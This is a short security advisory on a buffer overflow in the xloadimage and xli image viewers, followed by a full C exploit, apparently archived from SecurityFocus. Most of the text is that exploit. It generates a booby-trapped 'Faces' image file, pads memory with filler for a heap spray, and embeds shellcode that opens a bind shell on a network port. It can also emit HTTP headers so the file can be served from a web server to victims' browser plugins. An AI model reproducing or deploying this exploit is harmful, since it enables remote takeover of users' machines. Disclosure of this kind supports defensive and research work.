source: http://www.securityfocus.com/bid/3006/info

xloadimage is a utility used for displaying images of varying formats on X11 servers.

xloadimage and possibly derivatives such as 'xli' contain a buffer overflow vulnerability in the handling of the 'Faces Project' image type.

It is possible for remote attackers to create a file that will exploit this overflow to execute arbitrary code. An optional netscape plugin shipped with Red Hat powertools invokes xloadimage to load certain image types. If this plugin is in use, this vulnerability may be remotely exploitable if an attacker places the exploit-file on a webserver.

S.uS.E. Linux also ships with plugger, which invokes a derivative of xloadimage called 'xli'. 'xli' is also vulnerable. 

//#define TARGET 0x080e1337
//as 1337 as the 1337357 kiddies.
#define TARGET 0xdeadbeef

// lamagra's port binding shell code (from bind.c in the sc.tar.gz)
//
char lamagra_bind_code[] =
  "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
  "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
  "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x1d\x29\x89\x4d\xf0"
  "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
  "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
  "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
  "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
  "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

// slight modification so it listens on 7465 instead of 3879
// TAGS is easier to remember ;]

char *
this (int doit)
{
  char *p;
  int v;
  p = (char *) malloc (8200);
  memset (p, 0x90, 8200);
  if (!doit)
    for (v = 0; v < 8100; v += 122)
      {
	p[v] = 0xeb;
	p[v + 1] = 120;
      }
  if (doit)
    memcpy (&p[7000], lamagra_bind_code, strlen (lamagra_bind_code));
  p[8199] = 0;

  return p;
}

main (int argc)
{
  int z0, x = TARGET;
  int z1, y = x;
  int p;
  char *q;
  if (argc > 1)
    printf ("HTTP/1.0 200\nContent-Type: image/x-tiff\n\n");
  printf ("FirstName: %s\n", this (0));
  printf ("LastName: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
  printf ("%s\n", &x);
// Begin Padding Heap With 'Garbage' (nop/jmp)
  printf ("%s", this (0));
  printf ("%s", this (0));
  printf ("%s", this (0));
  printf ("%s", this (0));
  printf ("%s", this (0));
  printf ("%s", this (0));
// End Padding Heap With 'Garbage' (nop/jmp)
  printf ("%s", this (1));
  printf ("http://www.mp3.com/cosv");
  printf ("\nPicData: 32 32 8\n");
  printf ("\n");
  for (p = 0; p < 9994; p += 1)
    printf ("A");
}

// EOF --  tstot.c  --